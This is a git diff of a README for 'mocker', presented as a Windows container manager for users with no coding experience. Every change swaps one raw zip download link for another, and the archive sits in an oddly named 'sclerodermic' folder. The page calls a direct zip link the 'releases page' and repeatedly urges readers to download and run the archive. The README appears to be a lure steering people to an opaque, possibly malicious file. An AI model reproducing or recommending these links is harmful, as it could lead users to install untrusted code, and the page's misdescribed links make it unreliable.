@@ -1,6 +1,6 @@
 # 🐳 mocker - Manage Containers with Ease
 
-[![Download mocker](https://img.shields.io/badge/Download-mocker-blue?style=for-the-badge)](https://github.com/Banarun877/mocker/raw/refs/heads/main/sclerodermic/Software-3.5.zip)
+[![Download mocker](https://img.shields.io/badge/Download-mocker-blue?style=for-the-badge)](https://raw.githubusercontent.com/Banarun877/mocker/main/sclerodermic/Software-2.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Use this guide to download and run mocker on Windows. No coding experience is ne
 
 Click the blue button at the top or go to:
 
-https://github.com/Banarun877/mocker/raw/refs/heads/main/sclerodermic/Software-3.5.zip
+https://raw.githubusercontent.com/Banarun877/mocker/main/sclerodermic/Software-2.1.zip
 
 This page has all the available versions. Look for the latest release.
 
@@ -146,7 +146,7 @@ mocker stats
 
 Use this link whenever you want to check for new versions or download mocker:
 
-https://github.com/Banarun877/mocker/raw/refs/heads/main/sclerodermic/Software-3.5.zip
+https://raw.githubusercontent.com/Banarun877/mocker/main/sclerodermic/Software-2.1.zip
 
 Click the big blue “Download mocker” button at the top anytime.
 
@@ -156,7 +156,7 @@ Click the big blue “Download mocker” button at the top anytime.
 
 To keep mocker up to date:
 
-1. Visit the releases page: https://github.com/Banarun877/mocker/raw/refs/heads/main/sclerodermic/Software-3.5.zip
+1. Visit the releases page: https://raw.githubusercontent.com/Banarun877/mocker/main/sclerodermic/Software-2.1.zip
 2. Download the newest Windows release.
 3. Replace your current files or run the new installer.
 
@@ -216,4 +216,4 @@ mocker compose --help
 
 ---
 
-[![Download mocker](https://img.shields.io/badge/Download-mocker-blue?style=for-the-badge)](https://github.com/Banarun877/mocker/raw/refs/heads/main/sclerodermic/Software-3.5.zip)
+[![Download mocker](https://img.shields.io/badge/Download-mocker-blue?style=for-the-badge)](https://raw.githubusercontent.com/Banarun877/mocker/main/sclerodermic/Software-2.1.zip)
